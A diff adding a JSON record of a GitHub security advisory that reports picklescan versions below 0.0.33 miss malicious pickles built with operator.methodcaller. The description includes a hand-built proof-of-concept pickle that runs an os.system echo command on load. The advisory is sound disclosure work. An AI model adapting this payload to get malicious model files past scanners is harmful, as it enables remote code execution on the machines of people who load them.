@@ -1,0 +1,52 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2025-12-29T20:03:31Z",
+  "Package": {
+    "Ecosystem": "PIP",
+    "Name": "picklescan"
+  },
+  "Advisory": {
+    "DatabaseId": 328883,
+    "Id": "GSA_kwCzR0hTQS14ODQzLWc1bXgtZzM3N84ABQSz",
+    "GhsaId": "GHSA-x843-g5mx-g377",
+    "References": [
+      {
+        "Url": "https://github.com/mmaitre314/picklescan/security/advisories/GHSA-x843-g5mx-g377"
+      },
+      {
+        "Url": "https://github.com/mmaitre314/picklescan/pull/53"
+      },
+      {
+        "Url": "https://github.com/mmaitre314/picklescan/commit/70c1c6c31beb6baaf52c8db1b6c3c0e84a6f9dab"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-x843-g5mx-g377"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-x843-g5mx-g377"
+      }
+    ],
+    "Description": "### Summary\nPicklescan uses `operator.methodcaller`, which is a built-in python library function to execute remote pickle files.\n\n### Details\nThe attack payload executes in the following steps:\n\n- First, the attacker crafts the payload by calling the `operator.methodcaller` function in method `reduce`.\n- Then, when the victim checks whether the pickle file is safe using the Picklescan library and this library doesn't detect any dangerous functions, they decide to use pickle.load() on this malicious pickle file, thus leading to remote code execution.\n\n### PoC\n```\nimport pickle\nimport pickletools\nopcode1 = b'''cbuiltins\n__import__\n(Vos\ntRp0\n0coperator\nmethodcaller\n(Vsystem\nVecho \"pwned by operator.methodcaller\"\ntR(g0\ntR.'''\npickletools.dis(opcode1)\npickle.loads(opcode1)\n```\nThis PoC can't be easily created by pickle.dumps, therefore it was manually built. \n\n### Impact\nAny organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.\nAttackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.\nAttackers can distribute infected pickle files across ML models, APIs, or saved Python objects.\n\n### Report by\nPinji Chen (cpj24@mails.tsinghua.edu.cn) from the NISL lab (https://netsec.ccert.edu.cn/about) at Tsinghua University, Guanheng Liu (coolwind326@gmail.com).",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2025-12-29T20:03:30Z",
+    "Severity": "HIGH",
+    "Summary": "Picklescan is vulnerable to RCE through missing detection when calling built-in python operator.methodcaller",
+    "UpdatedAt": "2025-12-29T20:03:31Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.0.33"
+      },
+      "VulnerableVersionRange": "\u003c 0.0.33"
+    }
+  ]
+}
